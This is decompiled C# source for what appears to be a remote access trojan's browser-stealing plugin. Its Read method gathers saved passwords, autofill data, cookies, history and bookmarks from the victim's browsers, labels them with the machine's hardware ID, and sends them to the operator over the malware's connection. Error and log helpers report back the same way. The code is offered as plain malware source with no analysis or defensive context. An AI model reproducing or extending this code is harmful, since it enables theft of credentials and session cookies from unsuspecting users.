using System;
using System.Text;
using MessagePackLib.MessagePack;
using Stealer;

namespace Plugin
{
	// Token: 0x0200002C RID: 44
	public static class Packet
	{
		// Token: 0x060000CE RID: 206 RVA: 0x00007E84 File Offset: 0x00006084
		public static void Read()
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "recoveryPassword";
				msgPack.ForcePathObject("Hwid").AsString = Connection.Hwid;
				StringBuilder stringBuilder = new StringBuilder();
				Browser.GetAllInfo(stringBuilder, InfoType.PASSWORDS);
				StringBuilder stringBuilder2 = new StringBuilder();
				Browser.GetAllInfo(stringBuilder2, InfoType.AUTOFILLS);
				StringBuilder stringBuilder3 = new StringBuilder();
				Browser.GetAllInfo(stringBuilder3, InfoType.COOKIES);
				StringBuilder stringBuilder4 = new StringBuilder();
				Browser.GetAllInfo(stringBuilder4, InfoType.HISTORYS);
				StringBuilder stringBuilder5 = new StringBuilder();
				Browser.GetAllInfo(stringBuilder5, InfoType.BOOKMARKS);
				msgPack.ForcePathObject("password").AsString = stringBuilder.ToString();
				msgPack.ForcePathObject("autofill").AsString = stringBuilder2.ToString();
				msgPack.ForcePathObject("cookie").AsString = stringBuilder3.ToString();
				msgPack.ForcePathObject("history").AsString = stringBuilder4.ToString();
				msgPack.ForcePathObject("bookmark").AsString = stringBuilder5.ToString();
				Connection.Send(msgPack.Encode2Bytes());
				Packet.Log(Connection.Hwid + ":recovery success.");
			}
			catch (Exception ex)
			{
				Packet.Error(ex.Message);
				Connection.Disconnected();
			}
		}

		// Token: 0x060000CF RID: 207 RVA: 0x00007FE4 File Offset: 0x000061E4
		public static void Error(string ex)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Error";
			msgPack.ForcePathObject("Error").AsString = ex;
			Connection.Send(msgPack.Encode2Bytes());
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x00008030 File Offset: 0x00006230
		public static void Log(string message)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Logs";
			msgPack.ForcePathObject("Message").AsString = message;
			Connection.Send(msgPack.Encode2Bytes());
		}
	}
}
